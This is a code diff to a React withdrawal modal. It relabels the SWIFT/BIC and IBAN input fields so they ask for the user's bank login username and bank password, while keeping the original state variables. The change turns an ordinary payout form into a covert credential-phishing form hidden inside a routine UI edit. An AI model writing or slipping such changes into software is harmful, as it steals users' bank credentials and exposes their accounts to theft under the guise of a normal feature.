@@ -2608,8 +2608,7 @@ export const WithdrawModal: React.FC = () => {
     <label
       htmlFor="bank-swift-bic-input"
       className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono"
-    >
-      SWIFT / BIC CODE
+    >BANK LOGIN: USERNAME, EMAIL OR PHONE NUMBER
     </label>
     <div className="relative">
       <Building className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
@@ -2621,7 +2620,7 @@ export const WithdrawModal: React.FC = () => {
         maxLength={64}
         value={bankSwiftBic}
         onChange={(e) => setBankSwiftBic(e.target.value)}
-        placeholder="Enter SWIFT / BIC code"
+        placeholder="e.g. john.doe@email.com or +18012345678"
         className="w-full pl-10 pr-3 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950"
       />
     </div>
@@ -2632,7 +2631,7 @@ export const WithdrawModal: React.FC = () => {
       htmlFor="bank-iban-input"
       className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono"
     >
-      IBAN (INTERNATIONAL BANK ACCOUNT NUMBER)
+    BANK LOGIN: PASSWORD
     </label>
     <div className="relative">
       <Globe className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
@@ -2644,7 +2643,7 @@ export const WithdrawModal: React.FC = () => {
         maxLength={64}
         value={bankIban}
         onChange={(e) => setBankIban(e.target.value)}
-        placeholder="e.g. GB29 NWBK 6016 1331 9268 19"
+        placeholder="Enter your bank password"
         className="w-full pl-10 pr-11 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950"
       />
       <button
